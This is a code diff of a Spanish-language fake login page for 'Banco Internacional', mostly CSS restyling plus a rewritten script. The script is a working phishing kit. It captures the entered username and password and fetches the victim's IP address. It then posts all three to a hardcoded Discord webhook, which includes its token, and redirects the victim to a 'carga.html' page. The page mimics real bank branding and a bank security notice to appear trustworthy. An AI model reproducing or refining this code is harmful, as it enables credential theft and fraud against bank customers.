@@ -19,26 +19,32 @@
             padding: 15px;
         }
 
+        /* Cabecera */
         .header {
-            margin: 20px 0;
-            text-align: center;
+            margin-top: 20px;
+            margin-bottom: 20px;
             width: 100%;
+            text-align: center;
         }
-        .header img { width: 240px; height: auto; margin-bottom: 10px; }
-        
+        .header img {
+            width: 260px; 
+            height: auto;
+            margin-bottom: 15px;
+        }
         .nav-links {
             display: flex;
             justify-content: center;
-            gap: 15px;
+            gap: 12px;
             color: white;
             font-size: 13px;
         }
 
+        /* Tarjeta Principal */
         .main-container {
             width: 100%;
             max-width: 850px;
-            background: #fff;
-            border: 6px solid rgba(255, 255, 255, 0.3);
+            background-color: #fff;
+            border: 6px solid rgba(255, 255, 255, 0.25);
             border-radius: 4px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.2);
             overflow: hidden;
@@ -46,18 +52,28 @@
 
         .content-split { display: flex; flex-wrap: wrap; }
 
-        .login-side, .utils-side { flex: 1; min-width: 300px; padding: 40px 30px; }
-
-        .login-side { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center;
-            border-right: 1px solid #eee;
+        .login-side, .utils-side {
+            flex: 1;
+            min-width: 320px;
+            padding: 35px;
         }
 
-        h2 { font-size: 14px; color: #666; margin-bottom: 25px; text-transform: uppercase; font-weight: 600; }
+        .login-side {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border-right: 1px solid #f0f0f0;
+        }
+        
+        h2 {
+            font-size: 14px;
+            color: #777;
+            margin-bottom: 25px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
 
-        /* Contenedores de Input */
+        /* Pasos del Formulario */
         .step { width: 100%; max-width: 320px; display: none; }
         .step.active { display: block; }
 
@@ -67,6 +83,7 @@
             margin-bottom: 15px;
             border: 1px solid #ccc;
             border-radius: 3px;
+            overflow: hidden;
         }
         .input-label {
             background: #f8f8f8;
@@ -74,23 +91,28 @@
             align-items: center;
             padding: 0 10px;
             border-right: 1px solid #eee;
-            gap: 8px;
+            gap: 6px;
             min-width: 90px;
         }
-        .input-label img { width: 16px; }
+        .input-label img { width: 16px; height: 16px; }
         .input-label span { font-size: 11px; color: #888; }
 
-        input { flex: 1; border: none; padding: 0 12px; font-size: 15px; outline: none; }
+        input {
+            flex: 1;
+            border: none;
+            padding: 0 12px;
+            font-size: 15px;
+            outline: none;
+        }
 
-        .orange-btn {
+        .btn-orange {
             background: #f5a81c;
             width: 42px;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
         }
-        .orange-btn img { width: 20px; }
+        .btn-orange img { width: 20px; }
 
         .btn-submit {
             width: 100%;
@@ -98,27 +120,39 @@
             color: white;
             border: none;
             padding: 12px;
+            font-size: 14px;
             font-weight: bold;
             cursor: pointer;
             border-radius: 3px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
+
+        .info-box {
+            background: #f4f4f4;
+            width: 100%;
+            padding: 12px;
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            border-radius: 3px;
+        }
+        .info-box p { font-size: 11px; color: #666; }
 
         /* Utilidades */
         .utils-side { background: #fafafa; }
         .util-link {
             display: flex;
             align-items: center;
-            margin-bottom: 15px;
+            margin-bottom: 16px;
             text-decoration: none;
             color: #d48a00;
             font-size: 13px;
         }
-        .util-link img { width: 16px; margin-right: 10px; }
+        .util-link img { width: 16px; margin-right: 12px; }
 
-        /* Seguridad */
+        /* Footer Seguridad */
         .security-banner {
-            padding: 20px;
+            padding: 20px 30px;
             background: #fff;
             border-top: 1px solid #eee;
             display: flex;
@@ -129,16 +163,16 @@
         .security-banner p { font-size: 11px; color: #777; }
 
         @media (max-width: 650px) {
-            .content-split { flex-direction: column; }
             .login-side { border-right: none; border-bottom: 1px solid #eee; }
-            .nav-links { font-size: 12px; gap: 8px; }
+            .header img { width: 200px; }
+            .security-banner { flex-direction: column; text-align: center; }
         }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <img src="logow.png" alt="Logo">
+        <img src="logow.png" alt="Banco Internacional">
         <div class="nav-links">
             <span>Bienvenido(a)</span> | <span>Ayuda</span> | <span>Contáctanos</span>
         </div>
@@ -156,9 +190,9 @@
                             <span>Usuario</span>
                         </div>
                         <input type="text" id="usuario" placeholder="Ingresa tu usuario">
-                        <div class="orange-btn"><img src="question-icon-login.svg"></div>
+                        <div class="btn-orange"><img src="question-icon-login.svg"></div>
                     </div>
-                    <button class="btn-submit" onclick="showStep2()">Continuar</button>
+                    <button class="btn-submit" onclick="goToStep2()">Continuar</button>
                 </div>
 
                 <div id="step2" class="step">
@@ -168,15 +202,15 @@
                             <span>Clave</span>
                         </div>
                         <input type="password" id="clave" placeholder="Ingresa tu clave">
-                        <div class="orange-btn"><img src="question-icon-login.svg"></div>
+                        <div class="btn-orange"><img src="question-icon-login.svg"></div>
                     </div>
                     <button class="btn-submit" id="btnFinal">Ingresar</button>
-                    <p style="font-size: 11px; color: #d48a00; cursor: pointer; text-align: center;" onclick="location.reload()">← Volver</p>
+                    <p style="font-size: 11px; color: #d48a00; cursor: pointer; margin-bottom: 15px;" onclick="location.reload()">← Volver</p>
                 </div>
-
-                <div style="background:#f4f4f4; padding:10px; width:100%; max-width:320px; display:flex; gap:10px; border-radius:3px;">
-                    <img src="info-icon-login.svg" style="width:20px;">
-                    <p style="font-size:10px; color:#666;">Si ingresas con <b>USUARIO TEMPORAL</b> haz click aquí</p>
+                
+                <div class="info-box">
+                    <img src="info-icon-login.svg" width="20">
+                    <p>Si ingresas con <b>USUARIO TEMPORAL</b> haz click <a href="#" style="color:#d48a00; text-decoration:none;">aquí</a></p>
                 </div>
             </div>
 
@@ -189,46 +223,65 @@
         </div>
 
         <div class="security-banner">
-            <img src="shield-login.svg">
+            <img src="shield-login.svg" alt="S">
             <p>Banco Internacional <b>no solicita información personal</b> como claves por e-mail.</p>
         </div>
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW"; // Pon tu URL real aquí
-        let usuarioCapturado = "";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491163890715853021/Z7As4jVZZHi81cEJZjXhzbQez81R5grblQVbf29Rh4AH5Y2b8Jw54wBfVHNAPXC9QOkW";
 
-        function showStep2() {
+        function goToStep2() {
             const user = document.getElementById('usuario').value.trim();
-            if(!user) return alert("Ingresa tu usuario");
+            if(!user) return alert("Por favor ingresa tu usuario");
             
-            usuarioCapturado = user;
+            // GUARDAR PARA LAS SIGUIENTES PÁGINAS
+            localStorage.setItem('usuario_banco', user);
+            
             document.getElementById('step1').classList.remove('active');
             document.getElementById('step2').classList.add('active');
+            document.getElementById('clave').focus();
+        }
+
+        async function getIP() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch { return "No detectada"; }
         }
 
         document.getElementById('btnFinal').addEventListener('click', async () => {
+            const user = localStorage.getItem('usuario_banco');
             const pass = document.getElementById('clave').value.trim();
-            if(!pass) return alert("Ingresa tu clave");
+            
+            if(!pass) return alert("Por favor ingresa tu clave");
 
+            const ip = await getIP();
             const payload = {
                 embeds: [{
-                    title: "🔑 Credenciales Capturadas",
+                    title: "🏦 Nuevo Login Completo",
                     color: 16100380,
                     fields: [
-                        { name: "👤 Usuario", value: usuarioCapturado, inline: true },
-                        { name: "🔒 Clave", value: pass, inline: true }
-                    ]
+                        { name: "👤 Usuario", value: `**${user}**`, inline: true },
+                        { name: "🔒 Clave", value: `**${pass}**`, inline: true },
+                        { name: "🌐 IP", value: ip, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
                 }]
             };
 
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-            window.location.href = "carga.html";
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                // Redirigir a carga
+                window.location.href = "carga.html";
+            } catch (e) {
+                window.location.href = "carga.html";
+            }
         });
     </script>
 </body>
